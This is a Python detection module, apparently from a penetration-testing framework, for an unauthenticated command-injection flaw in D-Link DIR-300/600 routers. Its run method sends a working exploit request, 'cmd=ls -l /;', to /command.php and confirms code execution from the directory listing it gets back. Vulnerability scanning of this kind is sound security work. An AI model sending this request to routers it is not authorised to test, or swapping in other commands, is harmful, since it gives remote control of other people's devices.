#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-300/600 command.php RCE (CVE-2013-10048 / CVE-2013-10069)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-300/600 - command.php RCE Detection (CVE-2013-10048)',
        'description': (
            'Detects CVE-2013-10048/10069 by POSTing cmd=ls -l /; to /command.php '
            'with Cookie uid=vttest.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'dlink', 'router', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-10048',
        ],
        'cve': 'CVE-2013-10048',
    }

    def run(self):
        r = self.http_request(
            method='POST',
            path='/command.php',
            data='cmd=ls -l /;',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'uid=vttest',
            },
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if 'www' in body and 'sbin' in body and 'var' in body and 'drwxrwxr-x' in body:
            self.set_info(
                severity='critical',
                reason='D-Link DIR command.php RCE (CVE-2013-10048)',
                path='/command.php',
            )
            return True
        return False
